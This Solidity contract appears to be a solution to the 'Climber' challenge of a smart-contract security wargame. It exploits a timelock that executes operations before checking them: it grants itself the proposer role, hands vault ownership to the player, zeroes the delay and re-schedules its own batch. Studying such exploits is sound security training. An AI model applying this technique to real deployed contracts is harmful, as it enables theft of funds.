// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";

contract OperationScheduler {
    function scheduleOperations(
        address timelock,
        address vault,
        address player,
        bytes32 salt
    ) public {
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(vault);
        targets[2] = address(timelock);
        targets[3] = address(this);
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        dataElements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            player
        );
        dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[3] = abi.encodeWithSignature(
            "scheduleOperations(address,address,address,bytes32)",
            address(timelock),
            address(vault),
            player,
            0
        );
        ClimberTimelock(payable(timelock)).schedule(
            targets,
            values,
            dataElements,
            salt
        );
    }
}
